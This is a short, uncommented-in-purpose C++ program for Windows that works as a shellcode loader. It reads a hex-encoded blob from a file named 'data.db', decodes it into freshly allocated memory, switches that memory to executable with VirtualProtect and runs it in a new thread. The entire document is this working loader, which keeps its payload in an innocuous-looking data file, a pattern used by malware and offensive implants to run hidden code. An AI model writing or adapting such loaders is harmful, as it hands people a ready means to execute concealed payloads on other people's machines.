#include <Windows.h>
#include <iostream>
#include <fstream>
#include <sstream>

using namespace std;

void hex_to_ascii(string src, char* dst) {
	for (u_int i = 0; i < src.length(); i += 2) {
		dst[i / 2] = (char)strtoul(src.substr(i, 2).c_str(), NULL, 16);
	}
}

int main()
{
	std::fstream f("data.db", std::ios::in);
	if (!f.is_open())
		return 0;

	std::string buf;
	f >> buf;
	
	// create page
	char* addr = (char *)VirtualAlloc(NULL, buf.length() / 2, MEM_COMMIT, PAGE_READWRITE);
	if (!addr)
		return 0;

	// copy data
	hex_to_ascii(buf, addr);

	// change perms
	DWORD old;
	if (!VirtualProtect(addr, buf.length() / 2, PAGE_EXECUTE_READ, &old))
		return 0;

	// create thread
	DWORD tid;
	HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, &tid);
	if (!t)
		return 0;

	// wait
	WaitForSingleObject(t, INFINITE);

	return 0;
}

